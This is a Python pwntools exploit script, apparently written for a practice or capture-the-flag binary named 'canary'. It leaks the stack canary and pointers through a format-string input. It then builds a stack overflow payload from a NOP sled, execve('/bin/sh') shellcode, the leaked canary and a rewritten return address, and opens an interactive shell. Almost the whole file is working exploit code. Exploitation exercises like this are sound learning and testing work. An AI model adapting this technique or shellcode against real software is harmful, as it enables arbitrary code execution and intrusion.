#!/bin/python

import sys
from pwn import *


NOP = b'\x90'

""" 
from: http://shell-storm.org/shellcode/files/shellcode-806.php
main:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
""" 
SHELL = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97'
SHELL += b'\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
reservedStackForShell = b'\x90' * 30

#CANARY = 0x5869da29b1986f00
CANARY = b'\x00\x6f\x98\xb1' + b'\x29\xda\x69\x58'

#Base Pointer = 0x00007fffffffe390
BP = 'BBBB' + 'BBBB'

#Return Insturction Pointer = 0x00007fffffffe370 - 0x60
RIP = b'\x10\xe3\xff\xff' + b'\xff\x7f\x00\x00'

total = 13 * 8
mainStackSize = 16
canarySize = len(CANARY)
BPSize = len(BP)
RIPSize = len(RIP)
SHELLSize = len(SHELL)
guard = 30

target = process(['./canary', '%p_'*23])
stackContents = target.recvline()
print(stackContents)
stackContents = stackContents.decode('utf-8')
stackContents = stackContents.split('_')

#extract new line
stackContents.pop()

RIP = stackContents.pop()
BP = stackContents.pop()
CANARY = stackContents.pop()

RIP = pack(int(BP, 16) - mainStackSize - canarySize - BPSize - RIPSize - SHELLSize - guard - len(reservedStackForShell), 
                endianness="little", word_size=64)

BP = pack(int(BP, 16), endianness="little", word_size=64)
CANARY = pack(int(CANARY, 16), endianness="little", word_size=64)

print(f"RIP: {RIP}\n BP: {BP}\n CANARY: {CANARY}")



#Remove next info line:
target.recv()

#Write exploit:
exploitStream = (NOP * (total - len(SHELL) - len(reservedStackForShell)))
exploitStream += SHELL + reservedStackForShell + CANARY + BP + RIP 
write('input.txt', exploitStream)

input()
target.sendline(b'0')


target.interactive()

""" target = process('sh')
target.sendline(bytearray('echo Hello, world', 'utf-8'))
result = target.recvline()
print(result) """

#print (NOP * (total - len(SHELL))) + SHELL + CANARY + BP + RIP

